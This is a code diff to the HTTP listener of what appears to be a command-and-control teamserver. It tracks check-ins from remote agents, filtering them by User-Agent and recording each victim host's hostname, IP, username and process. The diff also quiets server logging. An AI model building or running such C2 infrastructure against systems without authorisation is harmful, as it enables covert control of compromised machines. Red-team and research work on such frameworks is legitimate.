@@ -3,6 +3,12 @@ import threading
 import time
 from .base_listener import BaseListener
 from teamserver.encryption.xor_util import XORCipher
+import logging
+
+
+log = logging.getLogger('werkzeug')
+log.setLevel(logging.ERROR)
+
 
 class HttpListener(BaseListener):
     def __init__(self, config, host="0.0.0.0", port=80, request_queue=None, agent_handler=None, xor_key=None):
@@ -45,8 +51,6 @@ class HttpListener(BaseListener):
 
     def handle_request(self):
         headers = dict(request.headers)
-        print(f"[*] Request on {request.path} with headers {headers}")
-
         expected_agent = self.config.get('user_agent')
         if expected_agent and request.headers.get("User-Agent") != expected_agent:
             return "Invalid User-Agent", 403
@@ -67,6 +71,8 @@ class HttpListener(BaseListener):
 
             now = time.time()
             if request.is_json and request.json:
+
+                print(request.json)
                 agent_fields = {
                     "last_seen": now,
                     "hostname": request.json.get("hostname"),
@@ -80,11 +86,14 @@ class HttpListener(BaseListener):
                 }
             if agent_id:
                 if not self.agent_handler.get_agent(agent_id):
-                    agent_info = {
-                        "agent_id": agent_id,
-                        "first_seen": now
+                    agent_fields = {
+                        "last_seen": now,
+                        "hostname": request.json.get("hostname"),
+                        "ip": request.remote_addr,
+                        "process_name": request.json.get("process_name"),
+                        "username": request.json.get("username")
                     }
-                    self.agent_handler.register_agent(agent_id, agent_info)
+                    self.agent_handler.register_agent(agent_id, agent_fields)
                 else:
                     self.agent_handler.update_agent(agent_id, agent_fields)
 
